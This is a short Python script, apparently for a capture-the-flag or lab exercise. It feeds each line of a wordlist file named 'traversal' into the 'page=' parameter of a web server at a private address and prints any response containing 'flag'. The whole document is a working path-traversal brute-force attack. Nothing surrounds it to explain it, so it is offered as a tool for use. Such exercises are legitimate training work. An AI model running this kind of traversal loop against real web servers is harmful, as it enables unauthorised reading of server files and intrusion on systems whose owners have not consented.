import sys
import requests

URL = "http://192.168.1.13?page="

with open('traversal') as f:
    content = f.readlines()
content = [x.strip() for x in content]

for path in content:
    try:
        r = requests.get(URL+path)
        if 'flag' in r.text or 'Flag' in r.text:
            print(r.text)
            sys.exit()
    except Exception:
        pass

